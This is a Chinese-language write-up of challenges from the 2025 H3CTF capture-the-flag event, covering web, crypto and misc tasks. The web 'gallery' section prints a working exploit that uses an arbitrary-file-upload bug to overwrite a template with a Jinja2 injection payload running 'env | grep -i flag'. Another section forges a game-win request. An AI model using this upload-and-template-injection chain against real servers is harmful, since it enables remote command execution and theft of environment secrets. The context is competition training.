[TOC]



# 2025H3CTFwriteup

## web

### 🎨 gallery

查看源代码，发现`allowed_file`函数存在缺陷

```python
def allowed_file(filename):
    return '.' in filename and filename.count('.') == 1
```

该函数只检查文件名中是否包含一个点，而不验证文件扩展名，导致可以上传任意文件。

这里还有一个问题要注意，文件名有且必须有一个点。

结合`os.path.normpath`和`os.path.join`的处理，可以通过绝对路径覆盖服务器文件：

```py
filename = os.path.normpath(file.filename)
file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
```

使用Burp Suite拦截上传请求，修改文件名和内容：

（这里是先随便上传了一张图片再用burp suite拦截）

```http
POST /upload HTTP/1.1
Host: 82.157.117.253:33459
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="/app/templates/index.html"
Content-Type: image/png

<!DOCTYPE html>
<html>
<body>
    <pre>{{ request.application.__globals__.__builtins__.__import__('os').popen('env | grep -i flag').read() }}</pre>
</body>
</html>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

上传模板后，访问首页触发Jinja2模板渲染，执行系统命令读取环境变量，之后在环境变量中发现flag：H3CTF{c123ffc21d57572c3583c4d7540b1974}

### ⚔️ kill the king

进入页面后是一个点击类游戏，玩家通过按空格键攻击敌人，击败敌人获得经验和金币，逐步提升属性，最终挑战 **King Trost**。

页面中提示

```html
<p id="flagBox"></p>
```

说明 flag 是通过 JavaScript 动态插入的，不会直接出现在源码中。

前端使用 Vue.js 构建，核心逻辑在 `logic.js` 中。

在 `punch()` 方法中，当击败最终 Boss（King Trost）时，触发以下代码：

```javascript
if (_this.boss) {
  _this.gamewin = true;
  fetch('check.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'result=win'
  })
  .then(response => response.text())
  .then(flag => {
    document.getElementById('flagBox').innerText = flag;
  });
}
```

我们不需要真的打完整个游戏，只需要模拟击败 Boss 后发送的请求即可。

在浏览器控制台，切换到 Console 标签，输入以下代码：

```javascript
fetch('check.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'result=win'
})
.then(response => response.text())
.then(flag => {
  console.log('Flag is:', flag);
  alert(flag);
});
```

浏览器会弹出 alert,显示flag

## crypto

### 🤔 SSS???

deepseek神力

level1

运行存在失败可能，需要多运行几次

```python
import socket


def solve_level1():
    # 连接服务器
    host = '82.157.117.253'
    port = 33930
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # 接收欢迎信息
    data = s.recv(1024).decode()
    print(data)

    # 选择关卡1
    s.send(b"1\n")

    # 接收p的值
    data = s.recv(1024).decode()
    print(data)

    # 解析p
    p_line = data.split('\n')[0]
    p = int(p_line.split(": ")[1])
    print(f"Got p: {p}")

    # 计算q = p // 2
    q = p // 2

    # 发送x = q
    s.send(f"{q}\n".encode())

    # 接收share
    data = s.recv(1024).decode()
    print(data)

    # 解析share
    share_line = data.split('\n')[0]
    share = int(share_line.split(": ")[1])
    print(f"Got share: {share}")

    # 计算r = share % q
    r = share % q

    # 猜测秘密（有50%概率正确）
    secret_guess = r
    print(f"Guessing secret: {secret_guess}")

    # 发送猜测
    s.send(f"{secret_guess}\n".encode())

    # 接收结果
    data = s.recv(1024).decode()
    print(data)

    # 检查是否成功
    if "flag" in data.lower() or "🥳" in data:
        print("Success!")
        # 继续接收可能的额外输出
        try:
            more_data = s.recv(1024).decode()
            print(more_data)
        except:
            pass
    else:
        print("Failed! The secret was probably r+q. Try again.")

    s.close()


# 自动重试直到成功
def solve_level1_with_retry(max_attempts=10):
    for attempt in range(max_attempts):
        print(f"\n=== Attempt {attempt + 1}/{max_attempts} ===")
        try:
            solve_level1()
            # 如果成功，break
            if attempt == 0:
                print("Success on first try!")
            else:
                print(f"Success after {attempt + 1} attempts!")
            break
        except Exception as e:
            print(f"Attempt {attempt + 1} failed with error: {e}")
            continue
    else:
        print(f"Failed after {max_attempts} attempts. The probability suggests this is very unlikely!")


if __name__ == "__main__":
    # 运行一次
    # solve_level1()

    # 或者使用重试版本
    solve_level1_with_retry()
```



## misc

### 📧神秘邮件

做一半实在是没有思路了/(ㄒoㄒ)/~~

将key.vim的宏修改为：

```
let @a = ""
normal qa
execute "normal :set filetype=markdown\<CR>"
execute "normal gg0/her\<CR>"
execute "normal \"ay2l/matter\<CR>"
execute "normal 3b4l\"by2l:4\<CR>"
execute "normal ww\"aP\"bp?ec\<CR>"
execute "normal r3llllR{}\<Esc>"
execute "normal magg0/have\<CR>"
execute "normal b\"ay2wtg;Ft;\"byw$Tn;l\"cywgwip^\"dy4lGkkkg_Fadalem\<Esc>"
execute "normal \"eyiw:6\<CR>"
execute "normal wgehhxfmP\"fyiw`a\"aPhdiw`aPkhhhhhhhhx`awgep\"bpP\"cpP\"dPl\"ep>
execute "normal bbb6hx3hxP:%s/aa/arra/g\<CR>"
execute "normal ``\<CR>"
execute "normal wwwxPpi4u7HoR\<Esc>"
execute "normal 4waBoFhdgg0O# p\<Esc>"
execute "normal :%s/  //g\<CR>"
execute "normal /{\<CR>"
execute "normal wwllxpU:%s/e/3/g\<CR>"
" execute "normal gg0:.,$d\<CR>"
" execute "normal iWhere did my flag go??\<Esc>"
normal q
```

得到

```
I r3ally lov3 Nanahira. Lik3, a lot. Lik3, a whol3 lot. You hav3 no id3a. I lov3 h3r so much that it is in3xplicabl3, and I'm nin3ty-nin3 p3rc3nt sur3 that I hav3 an unh3althy obs3ssion. I will n3v3r g3t tir3d of list3ning that sw33t, ang3lic voic3 of h3rs. It is my lif3 goal to m33t up h3r with h3r in r3al lif3 and just say h3llo to h3r.I fall asl33p at night dr3aming of h3r holding a p3rsoal conc3rt for nm3, and th3n sh3 would b3 sorry tir3d that sh3 com3s and cuddl3s up to m3 whil3 w3 sl33p tog3th3r. If I could just hold h3r hand for a bri3f mom3nt, I could di3 happy. If giv3n th3 opportunity, I would lightly nibbl3 on h3r 3ar just to h3ar what kind of sw33t moans sh3 would l3t out. Th3n, I would hug h3r whil3 sh3 clings to my body hoping that I would stop, but I only continu3 as sh3 moans loud3r and loud3r.I would giv3 up almost anything just for h3r to look in my g3n3ral dir3ction. No matt3r what I do, I am constantly thinking of h3r. Wh3n I wak3 up, sh3 is th3 first thing on my mind. Wh3n I go to school, I can only focus on h3r. Wh3n I go com3 hom3, I go on th3 comput3r so that I can list3n to h3r b3autiful voic3. Wh3n I go to sl33p, I dr3am of h3r and I living a happy lif3 tog3th3r. Sh3 is my prid3, passion, and joy. If sh3 w3r3 to call m3 "Oniichan," I would probably g3t diab3t3s from h3r sw33tn3ss and di3.I wish h3ctf{hav3You-tir3d-r3arrang3-probably-nm3?} nothing but h3r happin3ss. If it w3r3 f4u7HoRfor h3r, I wBoFhdgg0O# pould giv3 my lif3 without any s3cond thoughts. Without h3r, my lif3 would s3rv3 no purpos3. I r3ally lov3 Nanahira.
```

提示

```
h3ctf{hav3You-tir3d-r3arrang3-probably-nm3?}
```

找了好几个小时也没参透其中奥妙呜呜

### 🎄 SegmentTree

根据题目描述，需要通过线段树的区间加操作模拟，对初始全零数组进行一系列操作后，将每个位置的值转换为 ASCII 字符，从而得到 flag。初始数组大小为 38，操作数量为 36。操作格式为 `l r v`，表示将值 `v` 加到区间 `[l, r]` 的所有元素上。

通过模拟所有操作，计算每个位置的总加值，得到最终数组值

```
S(1)=72 → 'H'
S(2)=51 → '3'
S(3)=67 → 'C'
S(4)=84 → 'T'
S(5)=70 → 'F'
S(6)=123 → '{'
S(7)=87 → 'W'
S(8)=111 → 'o'
S(9)=119 → 'w'
S(10)=95 → '_'
S(11)=85 → 'U'
S(12)=95 → '_'
S(13)=107 → 'k'
S(14)=110 → 'n'
S(15)=48 → '0'
S(16)=119 → 'w'
S(17)=95 → '_'
S(18)=87 → 'W'
S(19)=104 → 'h'
S(20)=64 → '@'
S(21)=116 → 't'
S(22)=95 → '_'
S(23)=49 → '1'
S(24)=115 → 's'
S(25)=95 → '_'
S(26)=83 → 'S'
S(27)=51 → '3'
S(28)=103 → 'g'
S(29)=109 → 'm'
S(30)=101 → 'e'
S(31)=110 → 'n'
S(32)=116 → 't'
S(33)=95 → '_'
S(34)=84 → 'T'
S(35)=114 → 'r'
S(36)=51 → '3'
S(37)=51 → '3'
S(38)=125 → '}'
```

连接得到 flag：`H3CTF{Wow_U_kn0w_Wh@t_1s_S3gment_Tr33}`

### 📷 旅行日记

百度识图得到张家界，张家界最多的动物是猕猴